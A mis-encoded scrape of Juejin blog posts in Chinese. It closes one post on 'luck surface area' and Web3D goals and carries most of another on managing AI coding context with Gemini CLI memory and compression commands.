<p>æœ€è¿‘æˆ‘äº†è§£åˆ°ä¸€ä¸ªéå¸¸æœ‰è¶£çš„è§‚ç‚¹ï¼Œå« <strong>Luck Surface Areaï¼ˆè¿æ°”è¡¨é¢ç§¯ï¼‰</strong>ï¼Œæœ€æ—©æ¥è‡ª Jason Robertsï¼š</p>
<blockquote>
<p>ä½ ç”Ÿæ´»ä¸­ä¼šæœ‰å¤šå°‘â€˜æ— å¿ƒæ’æŸ³æŸ³æˆè«â€™çš„æ„å¤–ä¹‹å–œï¼Ÿè¿™å–å†³äºä½ çš„â€˜è¿æ°”è¡¨é¢ç§¯â€™ã€‚ <strong>LSAï¼ˆè¿æ°”ï¼‰ = Pï¼ˆçƒ­çˆ±/åšäº‹çš„æ·±åº¦ï¼‰ Ã— Cï¼ˆä¼ æ’­/è¿æ¥çš„å¹¿åº¦ï¼‰</strong></p>
</blockquote>
<p>è¿™ä¸ªä¹˜æ³•å…³ç³»å¾ˆç¥å¥‡ï¼Œæ„å‘³ç€å¦‚æœå…¶ä¸­ä¸€é¡¹ä¸ºé›¶ï¼Œæ€»ç»“æœå°±ä¸ºé›¶ï¼š</p>
<ul>
<li><strong>åªæœ‰çƒ­çˆ± (P)ï¼Œæ²¡æœ‰ä¼ æ’­ (C) = å­¤ç‹¬çš„è€•è€˜è€…</strong> å¦‚æœä½ å¯¹æŸäº‹æåº¦çƒ­çˆ±ï¼ŒæŠ€è‰ºç²¾æ¹›ï¼Œä½†æŠŠè‡ªå·±å…³åœ¨åœ°ä¸‹å®¤é‡Œï¼Œä»ä¸å‘å¤–ç•Œå±•ç¤ºï¼Œé‚£ä¹ˆä½ çš„â€œè¿æ°”è¡¨é¢ç§¯â€å‡ ä¹ä¸ºé›¶ã€‚å¤–ç•Œçš„æœºä¼šæ— æ³•ç©¿é€å¢™å£æ‰¾åˆ°ä½ ï¼Œâ€œé…’é¦™ä¹Ÿæ€•å··å­æ·±â€ã€‚</li>
<li><strong>åªæœ‰ä¼ æ’­ (C)ï¼Œæ²¡æœ‰çƒ­çˆ± (P) = ç©ºæ´çš„å–§å“—è€…</strong> å¦‚æœä½ æ“…é•¿è¥é”€ï¼Œä½†ä¼ æ’­çš„å†…å®¹ç¼ºä¹å†…æ ¸ï¼Œä¸æ˜¯ä½ çœŸæ­£çƒ­çˆ±æˆ–æ“…é•¿çš„ä¸œè¥¿ï¼Œä½ å¯èƒ½çŸ­æœŸè·å¾—å…³æ³¨ï¼Œä½†æ— æ³•å»ºç«‹æ·±åº¦çš„ä¿¡ä»»ï¼ŒçœŸæ­£çš„â€œå¥½è¿â€ä¾ç„¶å¾ˆéš¾é™ä¸´ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ee7f36435a04d7c9ad14356b3cc85f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=1wnXfZ39dgepKqzPaeFzA1vbSBc%3D" alt="Gemini_Generated_Image_bxxtb0bxxtb0bxxt.png" loading="lazy"/>
æˆ‘è§‰å¾—æˆ‘æ˜¯éå¸¸å¹¸è¿çš„ã€‚<strong>ä¼˜ç§€çš„ Web3D ä½œå“å¤©ç„¶å…·æœ‰è§†è§‰å†²å‡»åŠ›å’Œç¤¾äº¤å±æ€§</strong>ï¼Œè€Œç¨€åœŸæ˜é‡‘å¹³å°å¾ˆå¥½åœ°æ‰¿æ‹…äº†â€œä¼ æ’­â€çš„èŒè´£ï¼</p>
<p>æ‰€ä»¥ï¼Œå¹¶ä¸æ˜¯æˆ‘é€‰æ‹©äº†è¿™ä¸ªå¹³å°ï¼Œè€Œæ˜¯æˆ‘é‡åˆ°çš„äººã€äº‹ä»¥åŠå¹³å°ç»™äºˆçš„æ­£åé¦ˆæ¿€åŠ±ç€æˆ‘ï¼éå¸¸æ„Ÿè°¢èƒ½çœ‹åˆ°è¿™é‡Œçš„ä½ ï¼</p>
<h3 data-id="heading-11">5. æ‰€è§„åˆ’ä¹‹æœªæ¥</h3>
<p>2026 å¹´ä¼šæ˜¯ä»€ä¹ˆæ ·ï¼Ÿæˆ‘ä¸çŸ¥é“ã€‚å®ƒä¼šæ˜¯æˆ‘çš„â€œä¸‰å¹´ä¹‹çº¦â€ï¼Œæˆ‘å¸Œæœ›è‡ªå·±èƒ½å˜æˆæ›´å¥½çš„äººã€‚</p>
<p>ä½†æˆ‘ç¡®å®šæˆ‘ä¸€å®šä¼šï¼š</p>
<ul>
<li>ğŸ› ï¸ <strong>å¡«å‘</strong>ï¼šä¼˜åŒ–é‚£äº›æˆ‘æ²¡æœ‰å®Œå–„å¥½çš„é¡¹ç›®ï¼ˆåˆ«éª‚äº†åˆ«éª‚äº†ï¼‰ã€‚</li>
<li>âœ¨ <strong>åˆ›é€ </strong>ï¼šäº§å‡ºæ›´å¤šæœ‰è¶£çš„é¡¹ç›®å’ŒæŠ€æœ¯æ–‡ç« ã€‚</li>
<li>ğŸ¤ <strong>è¿æ¥</strong>ï¼šè®¤è¯†æ›´å¤šå¿—åŒé“åˆçš„æœ‹å‹ã€‚</li>
<li>ğŸŒ <strong>å¸ƒé“</strong>ï¼šå°† Web3D çš„é­…åŠ›åˆ†äº«ç»™æ›´å¤šçš„äººã€‚</li>
</ul>
<h3 data-id="heading-12">6.ä¸‰å¹´ä¹‹çº¦ï¼Œä½ ä¼šå¦‚çº¦è€Œè‡³å—ï¼Ÿ</h3>
<p><strong>æœ€åï¼Œå¦‚æœä½ æ„¿æ„ï¼Œä¹Ÿåœ¨è¿™ç¯‡æ–‡ç« çš„è¯„è®ºåŒºç•™ä¸‹å±äºä½ çš„ã€Œä¸‰å¹´ä¹‹çº¦ã€å§ï¼</strong></p>
<p>æ— è®ºæ˜¯æŠ€æœ¯çš„ç²¾è¿›ã€ç”Ÿæ´»çš„æ”¹å˜ï¼Œè¿˜æ˜¯ä¸€ä¸ªç®€å•çš„æ„¿æœ›ã€‚è®©æˆ‘ä»¬çº¦å®šåœ¨æœªæ¥çš„æŸä¸€å¤©å›å¤´çœ‹ï¼Œä¸€èµ·è§è¯å½¼æ­¤çš„èœ•å˜ï¼ğŸš€</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸ§  2025ï¼šAI å†™ä»£ç è¶Šæ¥è¶Šå¼ºï¼Œä½†æˆ‘çš„é¡¹ç›®è¿”å·¥å´æ›´å¤šäº†]]></title>    <link>https://juejin.cn/post/7592710766010040330</link>    <guid>https://juejin.cn/post/7592710766010040330</guid>    <pubDate>2026-01-08T08:04:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592710766010040330" data-draft-id="7592816646869483529" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸ§  2025ï¼šAI å†™ä»£ç è¶Šæ¥è¶Šå¼ºï¼Œä½†æˆ‘çš„é¡¹ç›®è¿”å·¥å´æ›´å¤šäº†"/> <meta itemprop="keywords" content="å‰ç«¯,æœºå™¨å­¦ä¹ ,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-08T08:04:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="webkubor"/> <meta itemprop="url" content="https://juejin.cn/user/2119514149631870"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸ§  2025ï¼šAI å†™ä»£ç è¶Šæ¥è¶Šå¼ºï¼Œä½†æˆ‘çš„é¡¹ç›®è¿”å·¥å´æ›´å¤šäº†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2119514149631870/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    webkubor
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T08:04:13.000Z" title="Thu Jan 08 2026 08:04:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    20
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>2025 å¹´ä¹‹å‰ï¼Œæˆ‘å¯¹ AI ç¼–ç¨‹å·¥å…·çš„æ€åº¦ä¸€ç›´å¾ˆçŸ›ç›¾ã€‚</p>
<p>å®ƒå¾ˆå¼ºï¼Œä½†åœ¨çœŸå®é¡¹ç›®é‡Œï¼Œ<strong>å¹¶ä¸å¯é </strong>ã€‚</p>
<p>å†™ Demoã€å†™å±€éƒ¨ä»£ç å¾ˆçˆ½ï¼›</p>
<p>ä¸€è¿›çœŸå®å·¥ç¨‹ï¼Œå°±å¼€å§‹æš´éœ²é—®é¢˜ï¼š</p>
<p>å¿˜è§„èŒƒã€å¿˜çº¦å®šã€å¿˜ä¸Šä¸‹æ–‡ï¼Œç”šè‡³å¿˜æ‰æˆ‘åˆšå¼ºè°ƒè¿‡çš„è§„åˆ™ã€‚</p>
<p>åæ¥æˆ‘æ‰æ„è¯†åˆ°ï¼Œé—®é¢˜ä¸åœ¨æ¨¡å‹èƒ½åŠ›ï¼Œè€Œåœ¨<strong>ä¸Šä¸‹æ–‡ä¸è®°å¿†çš„ç®¡ç†æ–¹å¼</strong>ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b8ab7f75eaa54fd3a7218676cc4de74e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2Via3Vib3I=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768468656&amp;x-signature=pvlKHEWyLd%2B0yhnjYAKguBqq1%2BI%3D" alt="æˆªå±2026-01-08 16.57.12.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-0"><strong>ä¸€ã€çœŸæ­£çš„ç—›ç‚¹ï¼šAI å†™å¾—å¿«ï¼Œä½†é¡¹ç›®æ€»æ˜¯è¢«â€œå†™æ­ªâ€</strong></h2>
<p>ä½œä¸ºå‰ç«¯å·¥ç¨‹å¸ˆï¼Œæˆ‘æœ€ç—›è‹¦çš„ä»æ¥ä¸æ˜¯â€œä»£ç éš¾å†™â€ï¼Œè€Œæ˜¯<strong>è¿”å·¥æˆæœ¬</strong>ã€‚</p>
<p>å¸¸è§æƒ…å†µåŒ…æ‹¬ï¼š</p>
<ul>
<li>
<p>æ˜æ˜æ˜¯ <strong>TypeScript + å‡½æ•°å¼ä¼˜å…ˆ</strong>ï¼Œå´ä¸æ–­ç”Ÿæˆæ¾æ•£çš„ JS é£æ ¼</p>
</li>
<li>
<p>é¡¹ç›®å·²æœ‰ç¨³å®šçš„æ¥å£ DTOã€ç›®å½•ç»“æ„ï¼Œå®ƒè¿˜æ˜¯ä¼šâ€œè‡ªåˆ›ä¸€å¥—â€</p>
</li>
<li>
<p>å¯¹è¯ä¸€é•¿ï¼Œå‰åè¾“å‡ºå¼€å§‹ä¸ä¸€è‡´ï¼Œç”šè‡³äº’ç›¸å†²çª</p>
</li>
</ul>
<p>ä¸€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯â€œæˆ‘ä¸ä¼šæé—®â€ï¼Œ</p>
<p>åæ¥å‘ç°ä¸æ˜¯ã€‚</p>
<p><strong>AI æœ€å¤§çš„é—®é¢˜ï¼Œæ˜¯å®ƒæ ¹æœ¬ä¸ç†è§£æˆ‘çš„é¡¹ç›®ï¼Œæ›´ä¸å¯èƒ½é•¿æœŸè®°ä½å®ƒã€‚</strong></p>
<hr/>
<h2 data-id="heading-1"><strong>äºŒã€è½¬æŠ˜ç‚¹ï¼šæˆ‘ä¸å†é‡å¤è§£é‡Šï¼Œè€Œæ˜¯è®©é¡¹ç›®è‡ªå·±â€œè¯´è¯â€</strong></h2>
<p>çœŸæ­£çš„æ”¹å˜ï¼Œæ¥è‡ªæˆ‘å¼€å§‹ä½¿ç”¨ <strong>Gemini CLI + æŒä¹…åŒ–ä¸Šä¸‹æ–‡</strong>ã€‚</p>
<p>æˆ‘åšçš„ç¬¬ä¸€ä»¶äº‹å¾ˆç®€å•ï¼š</p>
<p>åœ¨é¡¹ç›®æ ¹ç›®å½•åˆ›å»ºä¸€ä¸ª GEMINI.md æ–‡ä»¶ã€‚</p>
<p>å®ƒä¸æ˜¯ Prompt é›†åˆï¼Œè€Œæ˜¯<strong>é¡¹ç›®è§„åˆ™æœ¬èº«</strong>ï¼š</p>
<ul>
<li>
<p>æŠ€æœ¯æ ˆä¸ç¼–ç è§„èŒƒ</p>
</li>
<li>
<p>ç›®å½•ä¸æ¨¡å—çº¦å®š</p>
</li>
<li>
<p>è¾“å‡ºå¿…é¡»æ»¡è¶³çš„éªŒæ”¶æ¡ä»¶</p>
</li>
</ul>
<p>ä»é‚£ä¸€åˆ»å¼€å§‹ï¼Œæˆ‘ä¸å†å¯¹ AI è¯´â€œè®°ä½è¿™ä¸€ç‚¹â€ï¼Œ</p>
<p>è€Œæ˜¯é»˜è®¤å®ƒ<strong>è¿›å…¥é¡¹ç›®å°±è‡ªåŠ¨åŠ è½½è¿™äº›è§„åˆ™</strong>ã€‚</p>
<blockquote>
<p>æˆ‘ç¬¬ä¸€æ¬¡æ„è¯†åˆ°ï¼š <strong>ä¸Šä¸‹æ–‡ä¸è¯¥å­˜åœ¨äºå¯¹è¯é‡Œï¼Œè€Œåº”è¯¥å±äºé¡¹ç›®æœ¬èº«ã€‚</strong></p>
</blockquote>
<p>æ¯”å¦‚å¦‚å›¾æ‰€ç¤º</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/18489dab9cc64751a5a2150c0dcd6b29~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2Via3Vib3I=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768468656&amp;x-signature=%2FQiybwD1wkI8fckvh4tkfsHUanA%3D" alt="æˆªå±2026-01-08 17.03.29.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-2"><strong>ä¸‰ã€çŸ­æœŸè®°å¿†ä¸æ˜¯èŠå¤©è®°å½•ï¼Œè€Œæ˜¯â€œå·¥ä½œä¾¿ç­¾â€</strong></h2>
<p>å³ä¾¿æœ‰äº†æŒä¹…åŒ–è§„åˆ™ï¼Œå¼€å‘ä¸­ä»ç„¶å­˜åœ¨å¤§é‡<strong>ä¸´æ—¶ä½†å…³é”®çš„ä¿¡æ¯</strong>ï¼š</p>
<ul>
<li>
<p>å½“å‰ç¯å¢ƒçš„æ•°æ®åº“ç«¯å£</p>
</li>
<li>
<p>é‰´æƒæ–¹å¼ä¸ Header çº¦å®š</p>
</li>
<li>
<p>mock ä¸çœŸå®æ¥å£çš„åˆ‡æ¢è§„åˆ™</p>
</li>
</ul>
<p>è¿‡å»æˆ‘ä¼šåœ¨å¯¹è¯é‡Œåå¤å¼ºè°ƒï¼Œç°åœ¨æˆ‘åªåšä¸€ä»¶äº‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">/memory add <span class="hljs-string">"æ•°æ®åº“ç«¯å£æ˜¯ 5432"</span>
/memory add <span class="hljs-string">"æ¥å£ä½¿ç”¨ Bearer Token é‰´æƒ"</span>
</code></pre>
<p>è¿™äº›ä¿¡æ¯ä¼šè¢«æ˜¾å¼å­˜å…¥å½“å‰ä¼šè¯è®°å¿†ã€‚</p>
<p>å½“æˆ‘ç”¨ /memory show æŸ¥çœ‹æ—¶ï¼Œæ„Ÿè§‰æ›´åƒåœ¨çœ‹ä¸€ä¸ª<strong>é¡¹ç›®çŠ¶æ€æ¿</strong>ï¼Œè€Œä¸æ˜¯èŠå¤©å†å²ã€‚</p>
<hr/>
<h2 data-id="heading-3"><strong>å››ã€å¯¹è¯å˜é•¿ä¸å¯æ€•ï¼Œå‰ææ˜¯ä½ ä¼šâ€œå‹ç¼©ä¸Šä¸‹æ–‡â€</strong></h2>
<p>å¾ˆå¤šäººç”¨ AI åˆ°åæœŸéƒ½ä¼šé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼š</p>
<p>å®ƒå¼€å§‹å¿˜è®°å·²ç»ç¡®è®¤è¿‡çš„ç»“è®ºã€‚</p>
<p>æˆ‘ä»¥å‰çš„è§£å†³æ–¹æ¡ˆæ˜¯ï¼š</p>
<p>æ–°å¼€ä¼šè¯ï¼Œä»å¤´å†æ¥ã€‚</p>
<p>2025 å¹´æˆ‘æ¢äº†ä¸€ç§æ–¹å¼ï¼š</p>
<p><strong>è®© AI è‡ªå·±æ€»ç»“å½“å‰ä¸Šä¸‹æ–‡ã€‚</strong></p>
<p>å½“å¯¹è¯å˜é•¿ã€å¼€å§‹å‘æ•£æ—¶ï¼Œæˆ‘ä¼šä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">/compress
</code></pre>
<p>å®ƒä¼šæŠŠå†å²å¯¹è¯å‹ç¼©ä¸ºä¸€ä¸ªç»“æ„åŒ–æ‘˜è¦ï¼Œ</p>
<p>ä¿ç•™å†³ç­–å’Œçº¦æŸï¼Œä¸¢æ‰å™ªéŸ³ã€‚</p>
<p>è¿™ä¸æ˜¯ä¸ºäº†çœ Tokenï¼Œ</p>
<p>è€Œæ˜¯<strong>é‡æ–°è®©ä¸Šä¸‹æ–‡å˜å¾—æ¸…æ™°ã€å¯ç»§ç»­æ¨è¿›</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-4"><strong>äº”ã€ä»â€œä¼šå†™ä»£ç â€åˆ°â€œèƒ½å¹²æ´»â€ï¼šè®© AI æ¥å…¥çœŸå®å·¥ä½œæµ</strong></h2>
<p>çœŸæ­£è®©æˆ‘æŠŠ Gemini CLI å½“æˆåä½œè€…çš„ï¼Œæ˜¯ä¸‰ä»¶äº‹ã€‚</p>
<h3 data-id="heading-5"><strong>1ï¸âƒ£ å¼•ç”¨çœŸå®æ–‡ä»¶ï¼Œè€Œä¸æ˜¯å¤åˆ¶ç‰‡æ®µ</strong></h3>
<pre><code class="hljs language-bash" lang="bash">@./src/
@./src/main.ts
</code></pre>
<p>AI è¯»çš„æ˜¯å®Œæ•´é¡¹ç›®ç»“æ„ï¼Œè€Œä¸æ˜¯æˆ‘æŠ½è±¡å‡ºæ¥çš„ä¸€å°æ®µç¤ºä¾‹ã€‚</p>
<h3 data-id="heading-6"><strong>2ï¸âƒ£ å…è®¸å®ƒè·‘å‘½ä»¤ï¼Œç”¨ç»“æœé—­ç¯</strong></h3>
<pre><code class="hljs language-diff" lang="diff"><span class="hljs-addition">!git status</span>
<span class="hljs-addition">!pnpm test</span>
<span class="hljs-addition">!pnpm lint</span>
</code></pre>
<p>ä»è¿™ä¸€åˆ»å¼€å§‹ï¼ŒAI çš„ç›®æ ‡ä¸å†æ˜¯â€œçœ‹èµ·æ¥æ­£ç¡®â€ï¼Œ</p>
<p>è€Œæ˜¯<strong>æ˜¯å¦èƒ½é€šè¿‡çœŸå®éªŒè¯</strong>ã€‚</p>
<h3 data-id="heading-7"><strong>3ï¸âƒ£ MCPï¼šè®©å®ƒè¿›å…¥è°ƒè¯•ç°åœº</strong></h3>
<p>æ¥å…¥ chrome-devtools-mcp åï¼Œ</p>
<p>å®ƒå¯ä»¥ç›´æ¥çœ‹åˆ° Performanceã€Networkã€Console æ•°æ®ã€‚</p>
<p>ä¸æ˜¯æˆ‘è½¬è¿°é—®é¢˜ï¼Œ</p>
<p>è€Œæ˜¯å®ƒåŸºäº<strong>ä¸€æ‰‹è°ƒè¯•ä¿¡æ¯</strong>ç»™å‡ºåˆ¤æ–­ã€‚</p>
<p>ã€æ’å›¾æç¤ºã€‘</p>
<p>ğŸ‘‰ Gemini CLI å¼•ç”¨æ–‡ä»¶ + æ‰§è¡Œ Shell å‘½ä»¤æˆªå›¾</p>
<p>ğŸ‘‰ Chrome DevTools MCP å·¥ä½œç¤ºæ„å›¾</p>
<hr/>
<h2 data-id="heading-8"><strong>å…­ã€åŒä¸ºç¬¬ä¸€æ¢¯é˜Ÿï¼Œæˆ‘ä¸ºä»€ä¹ˆæ›´çœ‹é‡â€œä¸Šä¸‹æ–‡èƒ½åŠ›â€</strong></h2>
<p>2025 å¹´æˆ‘å¹¶ä¸åªç”¨ Geminiã€‚</p>
<p><strong>Codex 5.2</strong> åŒæ ·æ˜¯ç¬¬ä¸€æ¢¯é˜Ÿæ¨¡å‹ï¼Œåœ¨ä»£ç è´¨é‡å’Œé€»è¾‘ä¸¥è°¨æ€§ä¸Šéå¸¸å¼ºã€‚</p>
<p>ä½†åœ¨çœŸå®é¡¹ç›®ä¸­ï¼Œæˆ‘å¾ˆå¿«æ„Ÿå—åˆ°ä¸€ä¸ªå…³é”®å·®å¼‚ï¼š</p>
<blockquote>
<p><strong>å³ä½¿å¼€é€š 5.2ï¼ŒCodex å‡ ä¹ä¸å…·å¤‡é¡¹ç›®çº§ä¸Šä¸‹æ–‡è®°å¿†èƒ½åŠ›ã€‚</strong></p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7f30fa902f84601a95cd750a4d18d4f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2Via3Vib3I=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768468656&amp;x-signature=pTl%2FZdi0fwP3Sp1n%2B6sVO%2FRdsDc%3D" alt="æˆªå±2026-01-08 17.00.51.png" loading="lazy"/></p>
<p>å®ƒæ›´åƒä¸€ä¸ª<strong>é«˜è´¨é‡çš„å³æ—¶æ‰§è¡Œå™¨</strong>ï¼š</p>
<ul>
<li>
<p>ä¼šè¯ä¹‹é—´éš¾ä»¥ç»§æ‰¿é¡¹ç›®è®¤çŸ¥</p>
</li>
<li>
<p>è§„åˆ™ã€çº¦å®šéœ€è¦åå¤è¯´æ˜</p>
</li>
<li>
<p>å¯¹é•¿å‘¨æœŸåä½œå¹¶ä¸å‹å¥½</p>
</li>
</ul>
<p>è¿™ä¸æ˜¯èƒ½åŠ›é—®é¢˜ï¼Œè€Œæ˜¯è®¾è®¡å–å‘ä¸åŒã€‚</p>
<p>ä¹Ÿæ­£å› ä¸ºåŒæ—¶ä½¿ç”¨è¿‡è¿™ä¸¤ç±»å·¥å…·ï¼Œæˆ‘æ‰æ›´åŠ ç¡®ä¿¡ï¼š</p>
<blockquote>
<p><strong>æ¨¡å‹å¼ºä¸å¼ºå†³å®šä¸‹é™ï¼Œ</strong></p>
</blockquote>
<blockquote>
<p><strong>æ˜¯å¦å…·å¤‡ä¸Šä¸‹æ–‡ä¸è®°å¿†æœºåˆ¶ï¼Œæ‰å†³å®šå®ƒèƒ½å¦è¿›å…¥æ—¥å¸¸å·¥ç¨‹æµã€‚</strong>****</p>
</blockquote>
<hr/>
<h2 data-id="heading-9"><strong>ä¸ƒã€2025 æˆ‘å­¦åˆ°çš„ç»“è®ºï¼šAI ææ•ˆçš„æ ¸å¿ƒæ˜¯â€œä¸Šä¸‹æ–‡æ²»ç†â€</strong></h2>
<p>è¿™ä¸€å¹´çœŸæ­£å‘ç”Ÿå˜åŒ–çš„ï¼Œä¸åªæ˜¯å·¥å…·ï¼Œè€Œæ˜¯æˆ‘è‡ªå·±ã€‚</p>
<p>æˆ‘å¼€å§‹æ›´å¤šåœ°åšè¿™äº›äº‹ï¼š</p>
<ul>
<li>
<p>æ˜ç¡®è§„åˆ™ä¸è¾¹ç•Œ</p>
</li>
<li>
<p>è®¾è®¡éªŒæ”¶æ ‡å‡†</p>
</li>
<li>
<p>æŠŠâ€œæ­£ç¡®æ€§â€å·¥ç¨‹åŒ–</p>
</li>
</ul>
